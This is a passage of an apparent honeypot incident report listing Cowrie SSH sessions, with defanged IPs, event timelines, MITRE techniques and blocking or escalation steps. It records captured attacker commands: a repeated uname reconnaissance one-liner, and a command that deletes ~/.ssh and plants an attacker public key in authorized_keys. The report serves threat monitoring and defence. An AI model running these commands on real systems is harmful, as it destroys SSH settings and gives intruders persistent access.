| `2026-07-08 20:14:15` | `cowrie.client.kex` |
| `2026-07-08 20:14:18` | `cowrie.login.success` |
| `2026-07-08 20:14:19` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:14:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.152.90[.]68` to AbuseIPDB if not already reported
- [ ] Block `124.152.90[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d65a7f0a6af1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 20:15 |
| **Last Seen** | 2026-07-08 20:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:15:21` | `cowrie.session.connect` |
| `2026-07-08 20:15:21` | `cowrie.client.version` |
| `2026-07-08 20:15:21` | `cowrie.client.kex` |
| `2026-07-08 20:15:23` | `cowrie.login.success` |
| `2026-07-08 20:15:24` | `cowrie.session.params` |
| `2026-07-08 20:15:24` | `cowrie.command.input` |
| `2026-07-08 20:15:24` | `cowrie.command.input` |
| `2026-07-08 20:15:24` | `cowrie.command.input` |
| `2026-07-08 20:15:24` | `cowrie.command.input` |
| `2026-07-08 20:15:24` | `cowrie.command.input` |
| `2026-07-08 20:15:24` | `cowrie.command.success` |
| `2026-07-08 20:15:24` | `cowrie.command.input` |
| `2026-07-08 20:15:24` | `cowrie.command.input` |
| `2026-07-08 20:15:24` | `cowrie.command.input` |
| `2026-07-08 20:15:24` | `cowrie.command.input` |
| `2026-07-08 20:15:25` | `cowrie.log.closed` |
| `2026-07-08 20:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-198d477a2dee

| Field | Detail |
|---|---|
| **Source IP** | `51.75.142[.]157` |
| **First Seen** | 2026-07-08 20:15 |
| **Last Seen** | 2026-07-08 20:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:15:37` | `cowrie.session.connect` |
| `2026-07-08 20:15:37` | `cowrie.client.version` |
| `2026-07-08 20:15:37` | `cowrie.client.kex` |
| `2026-07-08 20:15:38` | `cowrie.login.success` |
| `2026-07-08 20:15:38` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:15:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.142[.]157` to AbuseIPDB if not already reported
- [ ] Block `51.75.142[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f7a531793b5

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]88` |
| **First Seen** | 2026-07-08 20:15 |
| **Last Seen** | 2026-07-08 20:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:15:43` | `cowrie.session.connect` |
| `2026-07-08 20:15:43` | `cowrie.client.version` |
| `2026-07-08 20:15:43` | `cowrie.client.kex` |
| `2026-07-08 20:15:45` | `cowrie.login.success` |
| `2026-07-08 20:15:45` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]88` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d655e495d416

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:15 |
| **Last Seen** | 2026-07-08 20:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:15:54` | `cowrie.session.connect` |
| `2026-07-08 20:15:54` | `cowrie.client.version` |
| `2026-07-08 20:15:54` | `cowrie.client.kex` |
| `2026-07-08 20:15:56` | `cowrie.login.success` |
| `2026-07-08 20:15:57` | `cowrie.session.params` |
| `2026-07-08 20:15:57` | `cowrie.command.input` |
| `2026-07-08 20:15:57` | `cowrie.command.input` |
| `2026-07-08 20:15:57` | `cowrie.command.input` |
| `2026-07-08 20:15:57` | `cowrie.command.input` |
| `2026-07-08 20:15:57` | `cowrie.command.input` |
| `2026-07-08 20:15:57` | `cowrie.command.success` |
| `2026-07-08 20:15:57` | `cowrie.command.input` |
| `2026-07-08 20:15:57` | `cowrie.command.input` |
| `2026-07-08 20:15:57` | `cowrie.command.input` |
| `2026-07-08 20:15:57` | `cowrie.command.input` |
| `2026-07-08 20:15:58` | `cowrie.log.closed` |
| `2026-07-08 20:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaea6715800e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 20:16 |
| **Last Seen** | 2026-07-08 20:17 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:16:43` | `cowrie.session.connect` |
| `2026-07-08 20:16:43` | `cowrie.client.version` |
| `2026-07-08 20:16:43` | `cowrie.client.kex` |
| `2026-07-08 20:16:44` | `cowrie.login.success` |
| `2026-07-08 20:16:45` | `cowrie.session.params` |
| `2026-07-08 20:16:45` | `cowrie.command.input` |
| `2026-07-08 20:17:22` | `cowrie.log.closed` |
| `2026-07-08 20:17:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a34de4f7734

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 20:17 |
| **Last Seen** | 2026-07-08 20:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:17:31` | `cowrie.session.connect` |
| `2026-07-08 20:17:32` | `cowrie.client.version` |
| `2026-07-08 20:17:32` | `cowrie.client.kex` |
| `2026-07-08 20:17:33` | `cowrie.login.success` |
| `2026-07-08 20:17:35` | `cowrie.session.params` |
| `2026-07-08 20:17:35` | `cowrie.command.input` |
| `2026-07-08 20:17:35` | `cowrie.command.input` |
| `2026-07-08 20:17:35` | `cowrie.command.input` |
| `2026-07-08 20:17:35` | `cowrie.command.input` |
| `2026-07-08 20:17:35` | `cowrie.command.input` |
| `2026-07-08 20:17:35` | `cowrie.command.success` |
| `2026-07-08 20:17:35` | `cowrie.command.input` |
| `2026-07-08 20:17:35` | `cowrie.command.input` |
| `2026-07-08 20:17:35` | `cowrie.command.input` |
| `2026-07-08 20:17:35` | `cowrie.command.input` |
| `2026-07-08 20:17:35` | `cowrie.log.closed` |
| `2026-07-08 20:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d0ac1b147db

| Field | Detail |
|---|---|
| **Source IP** | `203.198.173[.]137` |
| **First Seen** | 2026-07-08 20:17 |
| **Last Seen** | 2026-07-08 20:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:17:49` | `cowrie.session.connect` |
| `2026-07-08 20:17:50` | `cowrie.client.version` |
| `2026-07-08 20:17:50` | `cowrie.client.kex` |
| `2026-07-08 20:17:52` | `cowrie.login.success` |
| `2026-07-08 20:17:53` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.198.173[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.198.173[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-307edfed6b06

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:18 |
| **Last Seen** | 2026-07-08 20:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:18:04` | `cowrie.session.connect` |
| `2026-07-08 20:18:05` | `cowrie.client.version` |
| `2026-07-08 20:18:05` | `cowrie.client.kex` |
| `2026-07-08 20:18:06` | `cowrie.login.success` |
| `2026-07-08 20:18:07` | `cowrie.session.params` |
| `2026-07-08 20:18:07` | `cowrie.command.input` |
| `2026-07-08 20:18:07` | `cowrie.command.input` |
| `2026-07-08 20:18:07` | `cowrie.command.input` |
| `2026-07-08 20:18:07` | `cowrie.command.input` |
| `2026-07-08 20:18:07` | `cowrie.command.input` |
| `2026-07-08 20:18:07` | `cowrie.command.success` |
| `2026-07-08 20:18:07` | `cowrie.command.input` |
| `2026-07-08 20:18:07` | `cowrie.command.input` |
| `2026-07-08 20:18:07` | `cowrie.command.input` |
| `2026-07-08 20:18:07` | `cowrie.command.input` |
| `2026-07-08 20:18:08` | `cowrie.log.closed` |
| `2026-07-08 20:18:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8d805c75c0d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 20:19 |
| **Last Seen** | 2026-07-08 20:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:19:38` | `cowrie.session.connect` |
| `2026-07-08 20:19:38` | `cowrie.client.version` |
| `2026-07-08 20:19:38` | `cowrie.client.kex` |
| `2026-07-08 20:19:39` | `cowrie.login.success` |
| `2026-07-08 20:19:41` | `cowrie.session.params` |
| `2026-07-08 20:19:41` | `cowrie.command.input` |
| `2026-07-08 20:19:41` | `cowrie.command.input` |
| `2026-07-08 20:19:41` | `cowrie.command.input` |
| `2026-07-08 20:19:41` | `cowrie.command.input` |
| `2026-07-08 20:19:41` | `cowrie.command.input` |
| `2026-07-08 20:19:41` | `cowrie.command.success` |
| `2026-07-08 20:19:41` | `cowrie.command.input` |
| `2026-07-08 20:19:41` | `cowrie.command.input` |
| `2026-07-08 20:19:41` | `cowrie.command.input` |
| `2026-07-08 20:19:41` | `cowrie.command.input` |
| `2026-07-08 20:19:41` | `cowrie.log.closed` |
| `2026-07-08 20:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6fc3241d763

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:20 |
| **Last Seen** | 2026-07-08 20:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:20:20` | `cowrie.session.connect` |
| `2026-07-08 20:20:20` | `cowrie.client.version` |
| `2026-07-08 20:20:20` | `cowrie.client.kex` |
| `2026-07-08 20:20:22` | `cowrie.login.success` |
| `2026-07-08 20:20:23` | `cowrie.session.params` |
| `2026-07-08 20:20:23` | `cowrie.command.input` |
| `2026-07-08 20:20:23` | `cowrie.command.input` |
| `2026-07-08 20:20:23` | `cowrie.command.input` |
| `2026-07-08 20:20:23` | `cowrie.command.input` |
| `2026-07-08 20:20:23` | `cowrie.command.input` |
| `2026-07-08 20:20:23` | `cowrie.command.success` |
| `2026-07-08 20:20:23` | `cowrie.command.input` |
| `2026-07-08 20:20:23` | `cowrie.command.input` |
| `2026-07-08 20:20:23` | `cowrie.command.input` |
| `2026-07-08 20:20:23` | `cowrie.command.input` |
| `2026-07-08 20:20:24` | `cowrie.log.closed` |
| `2026-07-08 20:20:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e51d22946e2a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:22 |
| **Last Seen** | 2026-07-08 20:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:22:40` | `cowrie.session.connect` |
| `2026-07-08 20:22:40` | `cowrie.client.version` |
| `2026-07-08 20:22:40` | `cowrie.client.kex` |
| `2026-07-08 20:22:41` | `cowrie.login.success` |
| `2026-07-08 20:22:42` | `cowrie.session.params` |
| `2026-07-08 20:22:42` | `cowrie.command.input` |
| `2026-07-08 20:22:42` | `cowrie.command.input` |
| `2026-07-08 20:22:42` | `cowrie.command.input` |
| `2026-07-08 20:22:42` | `cowrie.command.input` |
| `2026-07-08 20:22:42` | `cowrie.command.input` |
| `2026-07-08 20:22:42` | `cowrie.command.success` |
| `2026-07-08 20:22:42` | `cowrie.command.input` |
| `2026-07-08 20:22:42` | `cowrie.command.input` |
| `2026-07-08 20:22:42` | `cowrie.command.input` |
| `2026-07-08 20:22:42` | `cowrie.command.input` |
| `2026-07-08 20:22:42` | `cowrie.log.closed` |
| `2026-07-08 20:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94f4262b467f

| Field | Detail |
|---|---|
| **Source IP** | `182.52.90[.]106` |
| **First Seen** | 2026-07-08 20:23 |
| **Last Seen** | 2026-07-08 20:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:23:23` | `cowrie.session.connect` |
| `2026-07-08 20:23:23` | `cowrie.client.version` |
| `2026-07-08 20:23:23` | `cowrie.client.kex` |
| `2026-07-08 20:23:25` | `cowrie.login.success` |
| `2026-07-08 20:23:26` | `cowrie.session.params` |
| `2026-07-08 20:23:26` | `cowrie.command.input` |
| `2026-07-08 20:23:26` | `cowrie.command.failed` |
| `2026-07-08 20:23:26` | `cowrie.log.closed` |
| `2026-07-08 20:23:27` | `cowrie.session.params` |
| `2026-07-08 20:23:27` | `cowrie.command.input` |
| `2026-07-08 20:23:27` | `cowrie.session.file_download` |
| `2026-07-08 20:23:27` | `cowrie.log.closed` |
| `2026-07-08 20:23:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.90[.]106` to AbuseIPDB if not already reported
- [ ] Block `182.52.90[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ee79b04bf57

| Field | Detail |
|---|---|
| **Source IP** | `182.52.90[.]106` |
| **First Seen** | 2026-07-08 20:23 |
| **Last Seen** | 2026-07-08 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:23:28` | `cowrie.session.connect` |
| `2026-07-08 20:23:28` | `cowrie.client.version` |
| `2026-07-08 20:23:28` | `cowrie.client.kex` |
| `2026-07-08 20:23:29` | `cowrie.login.success` |
| `2026-07-08 20:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.90[.]106` to AbuseIPDB if not already reported
- [ ] Block `182.52.90[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af311c6bb16f

| Field | Detail |
|---|---|
| **Source IP** | `182.52.90[.]106` |
| **First Seen** | 2026-07-08 20:23 |
| **Last Seen** | 2026-07-08 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:23:30` | `cowrie.session.connect` |
| `2026-07-08 20:23:30` | `cowrie.client.version` |
| `2026-07-08 20:23:30` | `cowrie.client.kex` |
| `2026-07-08 20:23:31` | `cowrie.login.success` |
| `2026-07-08 20:23:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.90[.]106` to AbuseIPDB if not already reported
- [ ] Block `182.52.90[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4da77682557

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:24 |
| **Last Seen** | 2026-07-08 20:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:24:58` | `cowrie.session.connect` |
| `2026-07-08 20:24:58` | `cowrie.client.version` |
| `2026-07-08 20:24:58` | `cowrie.client.kex` |
| `2026-07-08 20:24:59` | `cowrie.login.success` |
| `2026-07-08 20:25:00` | `cowrie.session.params` |
| `2026-07-08 20:25:00` | `cowrie.command.input` |
| `2026-07-08 20:25:00` | `cowrie.command.input` |
| `2026-07-08 20:25:00` | `cowrie.command.input` |
| `2026-07-08 20:25:00` | `cowrie.command.input` |
| `2026-07-08 20:25:00` | `cowrie.command.input` |
| `2026-07-08 20:25:00` | `cowrie.command.success` |
| `2026-07-08 20:25:00` | `cowrie.command.input` |
| `2026-07-08 20:25:00` | `cowrie.command.input` |
| `2026-07-08 20:25:00` | `cowrie.command.input` |
| `2026-07-08 20:25:00` | `cowrie.command.input` |
| `2026-07-08 20:25:00` | `cowrie.log.closed` |
| `2026-07-08 20:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06d6ebb8407a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:27 |
| **Last Seen** | 2026-07-08 20:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
